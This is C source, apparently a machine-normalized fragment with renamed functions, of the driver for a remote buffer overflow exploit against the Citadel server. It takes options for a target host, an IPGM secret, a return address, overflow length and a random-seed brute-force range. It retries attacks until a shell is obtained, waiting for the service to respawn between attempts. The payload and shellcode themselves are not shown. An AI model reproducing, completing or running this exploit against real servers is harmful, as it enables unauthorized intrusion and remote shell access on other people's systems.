#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
#define  BRUTE_FORCE_EXHAUSTED 134 
#define  CONNECT_ERR 133 
#define  HOST_NOT_RESOLVED 132 
#define  INCORRECT_IPGM_SECRET 131 
#define  NODELAY_ERR 130 
 int NUM_ATTEMPTS ; 
 void* RESPAWN_SLEEP ; 
 int SEED_MAX ; 
 int SEED_START ; 
#define  SHELL_NOT_FOUND 129 
 int /*<<< orphan*/  SIZ ; 
#define  SOCKET_ERR 128 
 int SUCCESS ; 
 int adjustRet ; 
 void* FUNC0 (int /*<<< orphan*/ ) ; 
 int FUNC1 () ; 
 int bufLenAdjust ; 
 int ch ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (int,char**,char*) ; 
 char* host ; 
 int localNet ; 
 int magicNumber ; 
 int nanoSecondsToSleep ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int retAddr ; 
 int retVal ; 
 int /*<<< orphan*/  FUNC5 (void*) ; 
 int /*<<< orphan*/  FUNC6 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC7 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC8 () ; 

FUNC9(int argc, char **argv) {
	int exploitAttempts=0;

	// parse command-line
	while((ch=FUNC3(argc, argv, "t:li:s:hr:a:A:o:O:b:B:n:S:"))!=-1) {
		switch(ch) {
 case 't':
 	FUNC6(host, optarg, SIZ-1);
 	break;
 case 'i':
 	magicNumber=FUNC0(optarg);
 	FUNC4("[-] Using IPGM secret: %d\n", magicNumber);
 	break;
 case 'l':
 	localNet=1;
 	FUNC4("[-] Using local net hack\n");
 	break;
 case 's':
 	nanoSecondsToSleep=FUNC0(optarg);
 	FUNC4("[-] Using sleep count of %d where necessary\n", nanoSecondsToSleep);
 	break;
 case 'r':
 	retAddr=FUNC7(optarg,NULL,16);
 	FUNC4("[-] Using RET address: 0x%08x\n", retAddr);
 	break;
 case 'a':
 	adjustRet=FUNC0(optarg);
 	retAddr+=adjustRet;
 	FUNC4("[-] Using RET address: 0x%08x\n", retAddr);
 	break;
 case 'A':
 	adjustRet=FUNC0(optarg);
 	retAddr-=adjustRet;
 	FUNC4("[-] Using RET address: 0x%08x\n", retAddr);
 	break;
 case 'o':
 	bufLenAdjust=FUNC0(optarg);
 	FUNC4("[-] Increasing overflow buffer by %d bytes\n", bufLenAdjust);
 	break;
 case 'O':
 	bufLenAdjust=FUNC0(optarg);
 	bufLenAdjust=-bufLenAdjust;
 	FUNC4("[-] Decreasing overflow buffer by %d bytes\n", bufLenAdjust);
 	break;
 case 'b':
 	SEED_START=FUNC0(optarg);
 	FUNC4("[-] Bruteforce starting at srand(%d)\n", SEED_START);
 	break;
 case 'B':
 	SEED_MAX=FUNC0(optarg);
 	FUNC4("[-] Bruteforce ending at srand(%d)\n", SEED_MAX);
 	break;
 case 'n':
 	NUM_ATTEMPTS=FUNC0(optarg);
 	FUNC4("[-] Will try exploit %d times\n", NUM_ATTEMPTS);
 	break;
 case 'S':
 	RESPAWN_SLEEP=FUNC0(optarg);
 	FUNC4("[-] Will sleep for %d seconds between exploit attempts\n");
 	break;
 case 'h':
 default:
 	FUNC8();
 	FUNC2(0);
		}
	}

	while(exploitAttempts++ < NUM_ATTEMPTS && (retVal=FUNC1())!=SUCCESS) {
		switch(retVal) {
 case HOST_NOT_RESOLVED:
 	FUNC4("[*] Couldn't connect to host: %s not found.\n", host);
 	FUNC2(1);
 	break;
 case SOCKET_ERR:
 	FUNC4("[*] Couldn't grab a socket!\n");
 	FUNC2(1);
 	break;
 case CONNECT_ERR:
 	FUNC4("[*] Connection to %s was rejected\n",host);
 	FUNC2(1);
 case NODELAY_ERR:
 	FUNC4("[!] WARNING: Failed to set TCP_NODELAY option on socket\n");
 	break;
 case BRUTE_FORCE_EXHAUSTED:
 	FUNC4("[*] Brute force operation failed. Aborting.\n");
 	FUNC2(1);
 	break;
 case INCORRECT_IPGM_SECRET:
 	FUNC4("[*] IPGM secret incorrect!\n");
 	FUNC2(1);
 	break;
 case SHELL_NOT_FOUND:
 	FUNC4("[!] This attempt failed... waiting for INIT to respawn Citadel...\n");
 	FUNC5(RESPAWN_SLEEP);
 	break;
 default:
 	FUNC4("[*] ERROR: There was no error!\n");
 	break;
		}
	}
	if(exploitAttempts==NUM_ATTEMPTS)
		FUNC4("[-] Exploit failed %d times. Aborting.\n", exploitAttempts);

	FUNC4("\nHave a nice day!\n");
	FUNC2(0);
}